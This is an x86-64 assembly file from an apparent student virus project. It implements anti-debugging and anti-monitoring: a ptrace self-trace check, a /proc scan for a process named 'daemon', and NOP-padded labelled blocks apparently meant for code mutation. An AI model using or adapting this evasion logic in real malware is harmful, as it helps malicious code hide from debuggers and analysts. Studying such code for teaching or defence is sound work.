; **************************************************************************** ;
;                                                                              ;
;                                                         :::      ::::::::    ;
;    detect_spy.s                                       :+:      :+:    :+:    ;
;                                                     +:+ +:+         +:+      ;
;    By: anselme <anselme@student.42.fr>            +#+  +:+       +#+         ;
;                                                 +#+#+#+#+#+   +#+            ;
;    Created: 2019/12/20 02:12:19 by anselme           #+#    #+#              ;
;    Updated: 2019/12/26 21:54:14 by anselme          ###   ########.fr        ;
;                                                                              ;
; **************************************************************************** ;

;bool detect_spy(void);

%define SYS_PTRACE		0x65

%define SYS_PTRACE		101
%define PTRACE_TRACEME		0
%define PID			0
%define ADDR			0
%define DATA			0

%define SYS_WRITE		1
%define STDOUT			1

%define SYS_OPEN		2
%define O_RDONLY		0

%define SYS_GETDENTS64		217
%define DT_DIR			4

%define	SYS_READ		0
%define SIZE_BUFF_STAT		32

%define SYS_CLOSE		3


section .text
	global detect_spy
	global detect_spy_end
	global lab_ptrace_begin
	global lab_ptrace_end
	global lab_proc_begin
	global lab_proc_end
	global lab_open_dir_begin
	global lab_open_dir_end
	global lab_getdent64_begin
	global lab_getdent64_end
	global lab_open_stat_begin
	global lab_open_stat_end
	global lab_read_stat_begin
	global lab_read_stat_end
	global lab_strstr_begin
	global lab_strstr_end
	global lab_close_stat_begin
	global lab_close_stat_end
	global lab_close_dir_begin
	global lab_close_dir_end
	global lab_close_stat_spy_detected_begin
	global lab_close_stat_spy_detected_end
	global lab_close_proc_spy_detected_begin
	global lab_close_proc_spy_detected_end

detect_spy:

	push rbp
	mov rbp, rsp

lab_ptrace_begin:
;	long	ptrace( PTRACE_TRACEME |  0   | NULL |   0  );
;                     |      %rdi      | %rsi | %rdx | %r10 |
	mov rdi, PTRACE_TRACEME
	mov rsi, PID
	mov rdx, ADDR
	mov r10, DATA
	mov rax, SYS_PTRACE
	times 42 db 0x90
lab_ptrace_end:
	syscall
	test rax, rax
%ifdef DEBUG
	jns after_ptrace
	push rax
	sub rsp, 8			; useless alignemt ?
	mov rax, 0x0a64657463657465
	push rax
	mov rax, 0x6420656361727470
	push rax

	; write(1, "ptrace detected\n", 16);
	mov rdi, STDOUT
	mov rsi, rsp
	mov rdx, 16
	mov rax, SYS_WRITE
	syscall

	add rsp, 24
	pop rax
	test rax, rax
%endif
	js spy_detected
after_ptrace:

	sub rsp, 5120			; char path[4096]; char buff_dirent[1024];
lab_proc_begin:
	mov r10, 0x00002f636f72702f	; ft_strcpy(path, "/proc/");
	times 11 db 0x90
lab_proc_end:
	mov [rsp + 1024], r10

	; int open( path  | O_RDONLY |;
	;         | %rdi  |   %rsi   |
	lea rdi, [rsp + 1024]
lab_open_dir_begin:
	mov rsi, O_RDONLY
	mov rax, SYS_OPEN
	times 22 db 0x90
lab_open_dir_end:
	syscall
	test rax, rax
	js spy_detected

	sub rsp, 8
	push rax			; fd
	; int getdents64(  fd  | (void*)buff_dirent |  1024 )
	;               | %rdi |        %rsi        |  %rdx |
getdents64_loop:
	mov rdi, [rsp]			; fd
	lea rsi, [rsp + 16]		; buff_dirent
lab_getdent64_begin:
	mov rdx, 1024
	mov rax, SYS_GETDENTS64
	times 42 db 0x90
lab_getdent64_end:
	syscall
	cmp rax, 0
	jle close_no_spy

	xor rdi, rdi			; bpos = 0;
browse_dirent_loop:
	; if (browse_dirent(path, path_end, buff_dirent, nread))
		; {famine_close(fd); return true;}
	cmp rdi, rax			; for (int bpos = 0; bpos < nread;)
	jge getdents64_loop
	lea r11, [rsp + 16 + rdi]	; struct dirent64 *file = (struct dirent64*)(buff_dirent + bpos);
	mov dl, [r11 + 18]		; file->d_type
	mov dh, DT_DIR
	cmp dl, dh
	jne next_file
	mov bl, [r11 + 19]
	cmp bl, 46 			; file->d_name[0] != '.'
	je next_file

	push rax			; nread
	push rdi			; bpos
	; ft_strlen(file->d_name)
	lea rdi, [r11 + 19]		; file->d_name
	xor al, al
	xor rcx, rcx
	not rcx
	cld
	repnz scasb
	not rcx
	dec rcx

	; ft_strcpy(path_end, file->d_name);
	lea rdi, [rsp + 1024 + 32 + 6]	; path_end
	lea rsi, [r11 + 19]		; file->d_name
	repnz movsb

	; if (is_target(path, path_end + ft_strlen(file->d_name)))
	;	return true;
	mov DWORD [rdi], 0x6174732f
	mov DWORD [rdi + 4], 0x74	; ft_strcpy(path_end, "/stat");

	push r11			; file
	sub rsp, 8
	; int open( path | O_RDONLY |;
	;         | %rdi |   %rsi   |
	lea rdi, [rsp + 1024 + 48]
lab_open_stat_begin:
	mov rsi, O_RDONLY
	mov rax, SYS_OPEN
	times 42 db 0x90
lab_open_stat_end:
	syscall
	test rax, rax
	js pop_next_file

	push rax			; fd
	; int     read( fd  , buff_stat, SIZE_BUFF_STAT);
	;             | rdi |   rsi    |       rdx     |
	sub rsp, 40			; char buff_stat[SIZE_BUFF_STAT];
	mov rdi, rax
	mov rsi, rsp
lab_read_stat_begin:
	mov rdx, SIZE_BUFF_STAT
	mov rax, SYS_READ
	times 22 db 0x90
lab_read_stat_end:
	syscall
	test rax, rax
	js close_stat

	; if (ft_strstr(buff_stat, target_process))
		; {famine_close(fd); return true;}
lab_strstr_begin:
	mov rax, 40			; '('
	mov rcx, 32
	times 22 db 0x90
lab_strstr_end:
	mov rdi, rsp
	cld
	repnz scasb
	cmp DWORD [rdi], 0x6d656164	; ft_strstr(buff_stat, "(daemon)");
	jne close_stat
	cmp DWORD [rdi + 4], 0x20296e6f
	je close_stat_proc_spy_detected

close_stat:
	add rsp, 40
	; int close(  fd )
	;          | rdi |
	pop rdi				; fd
lab_close_stat_begin:
	mov rax, SYS_CLOSE
	times 22 db 0x90
lab_close_stat_end:
	syscall

pop_next_file:
	add rsp, 8
	pop r11				; file
	pop rdi				; bpos
	pop rax				; nread

next_file:
	add di, [r11 + 16]
	jmp browse_dirent_loop

close_no_spy:
	; int close(  fd )
	;          | rdi |
	mov rdi, [rsp]			; fd
lab_close_dir_begin:
	mov rax, SYS_CLOSE
	times 22 db 0x90
lab_close_dir_end:
	syscall
	xor rax, rax
	leave
	ret

close_stat_proc_spy_detected:
	mov rdi, [rsp + 40]
lab_close_stat_spy_detected_begin:
	mov rax, SYS_CLOSE
	times 22 db 0x90
lab_close_stat_spy_detected_end:
	syscall
	mov rdi, [rsp + 80]
lab_close_proc_spy_detected_begin:
	mov rax, SYS_CLOSE
	times 22 db 0x90
lab_close_proc_spy_detected_end:
	syscall

spy_detected:
	mov rax, 1
	leave
	ret

detect_spy_end:
